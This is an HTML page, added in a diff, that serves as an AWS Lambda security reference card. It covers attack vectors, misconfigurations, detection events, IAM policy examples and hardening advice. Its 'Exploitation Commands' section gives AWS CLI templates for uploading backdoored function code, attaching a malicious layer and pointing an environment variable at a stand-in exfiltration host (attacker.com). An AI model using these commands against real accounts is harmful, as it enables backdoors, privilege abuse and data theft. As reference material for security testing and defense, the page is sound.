@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AWS Lambda Security | AWS Security Cards</title>
+<meta name="description" content="Lambda provides serverless function execution with execution roles controlling permissions. Over-privileged roles and secrets in environment variables are the primary attack vectors.">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    background: #0a0e1a;
+    color: #e2e8f0;
+    line-height: 1.6;
+    padding: 2rem;
+    max-width: 1200px;
+    margin: 0 auto;
+  }
+  a { color: #22d3ee; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+
+  /* Card Image */
+  .card-image {
+    border-radius: 1rem;
+    overflow: hidden;
+    margin-bottom: 2rem;
+    border: 1px solid rgba(255,255,255,0.1);
+  }
+  .card-image img {
+    width: 100%;
+    height: auto;
+    display: block;
+  }
+
+  /* Header */
+  .header {
+    position: relative;
+    overflow: hidden;
+    border-radius: 1rem;
+    background: linear-gradient(135deg, #06b6d415, #0a0e1a, #0ea5e915);
+    border: 1px solid #06b6d44d;
+    padding: 2.5rem;
+    margin-bottom: 2rem;
+  }
+  .header::before {
+    content: '';
+    position: absolute;
+    top: 0; right: 0;
+    width: 24rem; height: 24rem;
+    background: #06b6d40d;
+    border-radius: 50%;
+    filter: blur(3rem);
+  }
+  .header-content { position: relative; display: flex; align-items: flex-start; gap: 1.5rem; }
+  .header-icon { width: 64px; height: 64px; flex-shrink: 0; }
+  .header-icon img { width: 100%; height: 100%; }
+  .header-title { font-size: 1.875rem; font-weight: 700; color: #fff; }
+  .header-badge {
+    display: inline-block;
+    padding: 0.25rem 0.75rem;
+    background: #06b6d433;
+    color: #06b6d4;
+    font-size: 0.8rem;
+    font-weight: 600;
+    border-radius: 999px;
+    border: 1px solid #06b6d44d;
+    margin-left: 0.75rem;
+    vertical-align: middle;
+  }
+  .header-desc { color: #94a3b8; max-width: 42rem; margin-top: 0.5rem; }
+
+  /* Stats */
+  .stats-row { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1rem; margin-bottom: 2rem; }
+  .stat-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+    text-align: center;
+  }
+  .stat-value { font-size: 1.5rem; font-weight: 700; }
+  .stat-label { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Sections */
+  .section {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1.5rem;
+    margin-bottom: 1.5rem;
+  }
+  .section h2 {
+    font-size: 1.25rem;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 1rem;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
+
+  /* Overview */
+  .overview-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .overview-grid h4 { font-size: 0.9rem; font-weight: 600; margin-bottom: 0.5rem; }
+  .overview-grid p { font-size: 0.875rem; color: #94a3b8; margin-bottom: 0.75rem; }
+  .attack-note {
+    background: rgba(0,0,0,0.3);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 0.75rem;
+    font-size: 0.875rem;
+    color: #cbd5e1;
+  }
+
+  /* Risk Gauge */
+  .risk-gauge { display: flex; align-items: center; gap: 2rem; }
+  .risk-bar-container { flex: 1; }
+  .risk-bar {
+    height: 1rem;
+    background: #0f172a;
+    border-radius: 999px;
+    overflow: hidden;
+  }
+  .risk-bar-fill {
+    height: 100%;
+    border-radius: 999px;
+    background: linear-gradient(90deg, #eab308, #f97316, #ef4444);
+  }
+  .risk-labels { display: flex; justify-content: space-between; font-size: 0.8rem; color: #94a3b8; margin-top: 0.5rem; }
+  .risk-score { text-align: center; }
+  .risk-score-value { font-size: 2.5rem; font-weight: 700; color: #fb923c; }
+  .risk-score-label { font-size: 0.8rem; color: #94a3b8; }
+  .risk-desc { margin-top: 1rem; font-size: 0.875rem; color: #94a3b8; }
+
+  /* Panels Grid */
+  .panels-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.5rem; margin-bottom: 1.5rem; }
+  @media (max-width: 1024px) { .panels-grid { grid-template-columns: repeat(2, 1fr); } }
+  @media (max-width: 640px) { .panels-grid, .stats-row, .overview-grid { grid-template-columns: 1fr; } }
+  .panel {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid;
+    padding: 1.5rem;
+  }
+  .panel h3 { font-size: 1.1rem; font-weight: 700; margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem; }
+  .panel h4 { font-size: 0.85rem; font-weight: 600; margin-bottom: 0.5rem; margin-top: 1rem; }
+  .panel ul { list-style: none; padding: 0; }
+  .panel li {
+    font-size: 0.85rem;
+    color: #cbd5e1;
+    padding: 0.15rem 0;
+    display: flex;
+    align-items: flex-start;
+    gap: 0.5rem;
+  }
+  .bullet { margin-top: 0.15rem; }
+  .note {
+    margin-top: 1rem;
+    padding: 0.75rem;
+    border-radius: 0.5rem;
+    font-size: 0.85rem;
+  }
+
+  /* Commands */
+  .cmd-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .cmd-block { margin-top: 0.75rem; }
+  .cmd-title { font-size: 0.8rem; color: #94a3b8; margin-bottom: 0.25rem; }
+  pre {
+    background: rgba(0,0,0,0.5);
+    border-radius: 0.5rem;
+    padding: 0.75rem;
+    font-size: 0.8rem;
+    color: #4ade80;
+    overflow-x: auto;
+    border: 1px solid rgba(255,255,255,0.06);
+    white-space: pre-wrap;
+    word-break: break-all;
+    font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace;
+  }
+
+  /* Policies */
+  .policy-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .policy-card {
+    border-radius: 0.5rem;
+    border: 1px solid;
+    padding: 1rem;
+  }
+  .policy-header { display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.75rem; font-size: 0.9rem; }
+  .policy-card pre { margin-bottom: 0.75rem; color: #cbd5e1; }
+  .policy-desc { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Defenses */
+  .defense-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .defense-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+  }
+  .defense-card:hover { border-color: #22d3ee4d; }
+  .defense-header { display: flex; align-items: flex-start; gap: 0.75rem; }
+  .defense-icon { font-size: 1.5rem; }
+  .defense-card h4 { font-size: 0.9rem; font-weight: 600; color: #fff; margin-bottom: 0.25rem; }
+  .defense-card p { font-size: 0.85rem; color: #94a3b8; margin-bottom: 0.5rem; }
+  .defense-card pre { color: #22d3ee; }
+
+  /* Footer */
+  .footer { text-align: center; padding: 1.5rem 0; font-size: 0.8rem; color: #64748b; }
+  .footer a { color: #22d3ee; }
+
+  /* Prevent ugly page-break splits */
+  .card-image,
+  .header,
+  .stat-card,
+  .stats-row,
+  .section,
+  .panel,
+  .cmd-block,
+  .policy-card,
+  .defense-card,
+  .attack-note,
+  .overview-grid > div,
+  .risk-gauge,
+  .note {
+    break-inside: avoid;
+    page-break-inside: avoid;
+  }
+  .section,
+  .panels-grid,
+  .card-image,
+  .header {
+    break-before: auto;
+    page-break-before: auto;
+  }
+  /* Keep headings with their content */
+  h2, h3, h4 {
+    break-after: avoid;
+    page-break-after: avoid;
+  }
+
+  @media print {
+    body { background: #0a0e1a; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+    /* Switch panels to 2-col for better page flow */
+    .panels-grid { grid-template-columns: repeat(2, 1fr); }
+    /* Switch commands and policies to single column to avoid splits */
+    .cmd-grid { grid-template-columns: 1fr; }
+    .policy-grid { grid-template-columns: 1fr; }
+    .defense-grid { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<!-- Card Image -->
+<div class="card-image">
+  <img src="../images/lambda-card.webp" alt="AWS Lambda Security" />
+</div>
+
+<!-- Header -->
+<div class="header">
+  <div class="header-content">
+    <div class="header-icon"><img src="../icons/lambda.svg" alt="AWS Lambda Security" /></div>
+    <div>
+      <div>
+        <span class="header-title">AWS Lambda Security</span>
+        <span class="header-badge">SERVERLESS</span>
+      </div>
+      <p class="header-desc">Lambda provides serverless function execution with execution roles controlling permissions. Over-privileged roles and secrets in environment variables are the primary attack vectors.</p>
+    </div>
+  </div>
+</div>
+
+<!-- Stats -->
+<div class="stats-row">
+        <div class="stat-card">
+          <div class="stat-value" style="color: #f87171;">HIGH</div>
+          <div class="stat-label">Risk Level</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #4ade80;">Regional</div>
+          <div class="stat-label">Scope</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #60a5fa;">15 min</div>
+          <div class="stat-label">Max Timeout</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #c084fc;">Roles</div>
+          <div class="stat-label">Execution</div>
+        </div></div>
+
+<!-- Overview -->
+<div class="section"><h2><span style="color:#06b6d4;">&#x1F4CB;</span> Service Overview</h2><div class="overview-grid">
+        <div>
+          <h4 style="color: #06b6d4;">Execution Environment</h4>
+          <p>Lambda functions run in isolated containers with temporary credentials from the execution role. Environment variables, layers, and event data can all contain sensitive information.</p>
+          <div class="attack-note"><span style="color:#06b6d4;">Attack note:</span> Execution roles are often overly permissive with broad S3, DynamoDB, or Secrets Manager access</div>
+        </div>
+        <div>
+          <h4 style="color: #06b6d4;">Triggers &amp; Access</h4>
+          <p>Functions can be triggered by API Gateway, S3, SQS, EventBridge, and more. Function URLs provide direct HTTP access without API Gateway.</p>
+          <div class="attack-note"><span style="color:#06b6d4;">Attack note:</span> Function URLs with NONE auth type are publicly accessible</div>
+        </div></div></div>
+
+<!-- Risk Assessment -->
+
+<div class="section">
+  <h2>Security Risk Assessment</h2>
+  <div class="risk-gauge">
+    <div class="risk-bar-container">
+      <div class="risk-bar">
+        <div class="risk-bar-fill" style="width: 75%;"></div>
+      </div>
+      <div class="risk-labels"><span>Low</span><span>Medium</span><span>High</span><span>Critical</span></div>
+    </div>
+    <div class="risk-score">
+      <div class="risk-score-value">7.5</div>
+      <div class="risk-score-label">Risk Score</div>
+    </div>
+  </div>
+  <p class="risk-desc">Lambda functions with over-privileged execution roles can be abused for credential theft and privilege escalation. Secrets in environment variables and code injection via event data are common vulnerabilities.</p>
+</div>
+
+<!-- Main Panels -->
+<div class="panels-grid">
+      <div class="panel" style="border-color: #f8717133;">
+        <h3 style="color: #f87171;">⚔️ Attack Vectors</h3><h4 style="color: #f87171;">Credential Theft</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Over-privileged execution roles</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Secrets in environment variables</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Steal credentials from context</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Function code with hardcoded keys</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Layer contains sensitive data</li></ul><h4 style="color: #f87171;">Code Exploitation</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Code injection via event data</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Dependency vulnerabilities</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Malicious layers</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Function URL without auth</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Deserialization attacks</li></ul></div>
+      <div class="panel" style="border-color: #fb923c33;">
+        <h3 style="color: #fb923c;">⚠️ Misconfigurations</h3><h4 style="color: #fb923c;">IAM Issues</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Execution role with * permissions</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> PassRole to any role</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Cross-account invoke allowed</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No resource-based policy</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Unused high-privilege roles</li></ul><h4 style="color: #fb923c;">Security Settings</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Function URL auth type NONE</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Secrets in plaintext env vars</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Outdated runtime versions</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No VPC configuration</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Code signing not enforced</li></ul></div>
+      <div class="panel" style="border-color: #22d3ee33;">
+        <h3 style="color: #22d3ee;">🔍 Enumeration</h3>
+        <div class="cmd-block">
+          <div class="cmd-title">List All Functions</div>
+          <pre><code>aws lambda list-functions</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Get Function Details</div>
+          <pre><code>aws lambda get-function \\
+  --function-name NAME</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Get Environment Variables</div>
+          <pre><code>aws lambda get-function-configuration \\
+  --function-name NAME</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Layers</div>
+          <pre><code>aws lambda list-layers</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Get Function Policy</div>
+          <pre><code>aws lambda get-policy --function-name NAME</code></pre>
+        </div></div>
+      <div class="panel" style="border-color: #c084fc33;">
+        <h3 style="color: #c084fc;">📈 Privilege Escalation</h3><h4 style="color: #c084fc;">Function Abuse</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Invoke to steal role credentials</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Modify function code for backdoor</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Update configuration for exfil</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Attach permissive layer</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Create function with admin role</li></ul><h4 style="color: #c084fc;">Role Abuse</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> PassRole to Lambda + CreateFunction</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Use execution role externally</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Chain to higher privilege role</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Access Secrets Manager</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Read from privileged S3</li></ul><div class="note"><strong>Key insight:</strong> Lambda execution roles often have access to Secrets Manager, DynamoDB, and S3 with sensitive data.</div></div>
+      <div class="panel" style="border-color: #facc1533;">
+        <h3 style="color: #facc15;">🔗 Persistence</h3><h4 style="color: #facc15;">Code Modification</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Update function code with backdoor</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Add malicious layer</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Modify environment variables</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Create new function version</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Update alias to backdoored version</li></ul><h4 style="color: #facc15;">Trigger-Based</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Create S3 trigger for exfil</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Add SQS event source mapping</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> EventBridge scheduled execution</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> API Gateway endpoint</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> CloudWatch Events rule</li></ul></div>
+      <div class="panel" style="border-color: #4ade8033;">
+        <h3 style="color: #4ade80;">🛡️ Detection</h3><h4 style="color: #4ade80;">CloudTrail Events</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> UpdateFunctionCode</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> UpdateFunctionConfiguration</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreateFunction</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> AddLayerVersionPermission</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreateEventSourceMapping</li></ul><h4 style="color: #4ade80;">Indicators of Compromise</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Function code changes without deploy</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> New layers attached</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Unusual invocation patterns</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> External IP in VPC flow logs</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Execution role used from odd IPs</li></ul></div></div>
+
+<!-- Exploitation -->
+<div class="section"><h2><span style="color:#f87171;">&#x1F4BB;</span> Exploitation Commands</h2><div class="cmd-grid">
+        <div class="cmd-block">
+          <div class="cmd-title">Invoke Function</div>
+          <pre><code>aws lambda invoke \\
+  --function-name NAME \\
+  --payload '{&quot;cmd&quot;:&quot;id&quot;}' output.txt</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Update Function Code</div>
+          <pre><code>aws lambda update-function-code \\
+  --function-name NAME \\
+  --zip-file fileb://backdoor.zip</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Modify Environment Variables</div>
+          <pre><code>aws lambda update-function-configuration \\
+  --function-name NAME \\
+  --environment 'Variables={EXFIL=attacker.com}'</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Add Malicious Layer</div>
+          <pre><code>aws lambda update-function-configuration \\
+  --function-name NAME \\
+  --layers arn:aws:lambda:REGION:ACCOUNT:layer:backdoor:1</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Get Function Code (Download)</div>
+          <pre><code>aws lambda get-function --function-name NAME \\
+  --query 'Code.Location' --output text | xargs curl -o code.zip</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Create Event Source Mapping</div>
+          <pre><code>aws lambda create-event-source-mapping \\
+  --function-name NAME \\
+  --event-source-arn arn:aws:sqs:REGION:ACCOUNT:queue</code></pre>
+        </div></div></div>
+
+<!-- Policies -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F4DC;</span> Policy Examples</h2><div class="policy-grid">
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous - Full Access</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: &quot;*&quot;,
+    &quot;Resource&quot;: &quot;*&quot;
+  }]
+}</code></pre>
+          <p class="policy-desc">Function has FULL AWS access - complete account compromise</p>
+        </div>
+        <div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - Least Privilege</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: [&quot;s3:GetObject&quot;],
+    &quot;Resource&quot;: &quot;arn:aws:s3:::my-bucket/input/*&quot;
+  }, {
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: [&quot;logs:CreateLogStream&quot;, &quot;logs:PutLogEvents&quot;],
+    &quot;Resource&quot;: &quot;arn:aws:logs:*:*:log-group:/aws/lambda/my-func:*&quot;
+  }]
+}</code></pre>
+          <p class="policy-desc">Only specific S3 read and CloudWatch Logs access</p>
+        </div>
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous - PassRole</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: &quot;iam:PassRole&quot;,
+    &quot;Resource&quot;: &quot;*&quot;
+  }]
+}</code></pre>
+          <p class="policy-desc">Can pass any role to any service - privilege escalation</p>
+        </div>
+        <div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - Resource Policy</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Principal&quot;: {&quot;AWS&quot;: &quot;arn:aws:iam::123456789012:role/APIGatewayRole&quot;},
+    &quot;Action&quot;: &quot;lambda:InvokeFunction&quot;,
+    &quot;Resource&quot;: &quot;arn:aws:lambda:us-east-1:123456789012:function:my-func&quot;
+  }]
+}</code></pre>
+          <p class="policy-desc">Only specific API Gateway role can invoke the function</p>
+        </div></div></div>
+
+<!-- Defenses -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F6E1;&#xFE0F;</span> Defense Recommendations</h2><div class="defense-grid">
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔐</span>
+            <div>
+              <h4>Least Privilege Roles</h4>
+              <p>Scope permissions to exact resources and actions needed.</p>
+              <pre><code>&quot;Resource&quot;: &quot;arn:aws:s3:::my-bucket/prefix/*&quot;</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🚫</span>
+            <div>
+              <h4>Use Secrets Manager</h4>
+              <p>Never store secrets in environment variables.</p>
+              <pre><code>aws secretsmanager get-secret-value \\
+  --secret-id my-api-key</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔒</span>
+            <div>
+              <h4>Function URL IAM Auth</h4>
+              <p>Require IAM authentication for function URLs.</p>
+              <pre><code>--auth-type AWS_IAM (not NONE)</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">📝</span>
+            <div>
+              <h4>Resource Policies</h4>
+              <p>Restrict who can invoke the function.</p>
+              <pre><code>&quot;Principal&quot;: {&quot;AWS&quot;: &quot;arn:aws:iam::ACCOUNT:role/AllowedRole&quot;}</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🌐</span>
+            <div>
+              <h4>VPC Isolation</h4>
+              <p>Run functions in private VPC subnets when possible.</p>
+              <pre><code>--vpc-config SubnetIds=subnet-xxx,\\
+SecurityGroupIds=sg-xxx</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔍</span>
+            <div>
+              <h4>Code Signing</h4>
+              <p>Only allow signed code packages to be deployed.</p>
+              <pre><code>aws lambda create-code-signing-config \\
+  --allowed-publishers SigningProfileVersionArns=...</code></pre>
+            </div>
+          </div>
+        </div></div></div>
+
+<!-- Footer -->
+<div class="footer">
+  <p>AWS Lambda Security Card</p>
+  <p style="margin-top:0.25rem;">Always obtain proper authorization before testing</p>
+</div>
+
+</body>
+</html>
